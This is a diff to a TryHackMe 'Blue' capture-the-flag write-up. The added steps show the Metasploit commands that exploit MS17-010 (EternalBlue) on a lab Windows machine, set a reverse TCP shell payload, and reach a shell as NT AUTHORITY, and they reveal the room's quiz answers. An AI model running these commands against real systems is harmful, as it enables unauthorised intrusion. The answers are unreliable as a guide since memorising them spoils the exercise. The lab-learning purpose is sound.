@@ -44,31 +44,55 @@ In this part of the challenge we will find out more information about our target
 
 ### Gain Access
 
+In this part of the challenge we will use Metaspoit to exploit the vulnerability we found in the previous task.
 
-
-Start Metasploit
+*Start Metasploit*
 
 2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
 
+   We can search for any modules we can use within Metasploit.
+   
+   ```cmd
+   search ms17-010
+   ```
+   
+   ![MSF Module](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/blue/Access_MSF_Module.png)
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>exploit/windows/smb/ms17_010_eternalblue</details>
 
 3. Show options and set the one required value. What is the name of this value? (All caps for submission)
 
+   We now need to select this module and set any necessary options.
+   
+   ```cmd
+   use exploit/windows/smb/ms17_010_eternalblue
+   
+   options
+   
+   set rhosts 10.10.91.75
+   ```
+   
+   ![MSF Options](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/blue/Access_MSF_Options.png)
 
+   ><details><summary>Click for answer</summary>rhosts</details>
 
-   ><details><summary>Click for answer</summary></details>
-
-Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:
+*Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:*
 
 ```cmd
 set payload windows/x64/shell/reverse_tcp
 ```
 
-With that done, run the exploit!
+*With that done, run the exploit!*
 
-Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 
+We can do that by using `run` or `exploit`.
+
+![MSF Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/blue/Access_MSF_Exploit.png)
+
+*Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.*
+
+I had to restart the machine, as it didn't work the first time. In the end, though, I got a shell. And unlike the next few steps, the shell already appears to run as `NT ATUHORITY` using `whoami`.
+
+![MSF Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/blue/Access_MSF_Shell.png)
 
 ### Escalate
 
